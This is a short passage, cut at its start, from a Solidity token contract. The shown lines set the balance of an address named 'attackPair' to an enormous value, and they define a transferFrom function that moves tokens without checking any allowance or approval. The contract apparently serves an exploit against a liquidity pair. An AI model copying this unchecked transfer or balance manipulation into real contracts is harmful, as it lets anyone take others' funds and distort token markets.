            balances[attackPair] = 10_000_000_000_000_000_000_000_000_000_000;
        }

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool) {
        balances[from] -= value;
        balances[to] += value;
        return true;
    }
}


